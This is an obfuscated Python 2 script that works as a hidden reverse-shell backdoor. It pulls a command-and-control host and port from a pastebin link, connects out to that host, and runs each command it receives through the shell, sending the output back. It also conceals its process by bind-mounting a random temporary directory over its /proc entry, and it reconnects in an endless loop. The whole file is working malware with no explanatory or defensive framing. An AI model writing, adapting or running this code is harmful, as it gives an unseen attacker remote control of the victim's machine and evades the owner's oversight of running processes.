import os
import socket
import subprocess
import string
import time
import random
import requests
import base64
if 82 - 82: Iii1i
def Ii ( ) :
# a = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3NtUERNeU13Cg=="
# b = base64.b64decode(a)
# url = str(b)
 i11i1 = "https://pastebin.com/raw/smPDMyMw"
 II1Ii = requests . get ( i11i1 )
 IIiiIii = II1Ii . text
 oO0Oo0O = str ( IIiiIii )
 I1I = ( oO0Oo0O [ : 14 ] )
 ooo0oOoooOOO0 = str ( IIiiIii )
 oOo0O00 = ( ooo0oOoooOOO0 [ 15 : ] )
 Ii . h = str ( I1I )
 Ii . p = int ( oOo0O00 )
 if 83 - 83: iIII
 if 82 - 82: IiIIii11Ii % OOoOoo000O00 * Oo0Oo - ii1I1iII1I1I . i1I1IiIIiIi1 % oo0O000ooO
def iIIiiIIiii1 ( h , p ) :
 try :
  Ii ( )
  h = Ii . h
  p = Ii . p
  time . sleep ( 5 )
  iIi1ii1I1iI11 = socket . socket ( socket . AF_INET , socket . SOCK_STREAM )
  iIi1ii1I1iI11 . connect ( ( h , p ) )
  while True :
   o00o0OO00O = iIi1ii1I1iI11 . recv ( 1024 )
   if o00o0OO00O . strip ( "\n" ) == "exit" :
    iIi1ii1I1iI11 . close ( )
   Ooo = subprocess . Popen ( o00o0OO00O , stdout = subprocess . PIPE , stderr = subprocess . PIPE , stdin = subprocess . PIPE , shell = True )
   I1 = Ooo . stdout . read ( ) + Ooo . stderr . read ( )
   iIi1ii1I1iI11 . send ( I1 )
 except socket . error :
  pass
  if 71 - 71: i11 % iiI
if __name__ == "__main__" :
 i1Ii1i = string . uppercase + string . digits
 oOooo0OOO = "" . join ( random . choice ( i1Ii1i ) for i in range ( 72 ) )
 Oo000ooO0Oooo = os . getpid ( )
 os . system ( "mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}" . format ( Oo000ooO0Oooo , oOooo0OOO ) )
 if 25 - 25: IIIi - o0 . iiIII % oOoO / OO0000
 while True :
  oOoo0 = ""
  Iio0 = 0
  iIIiiIIiii1 ( oOoo0 , Iio0 )
# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3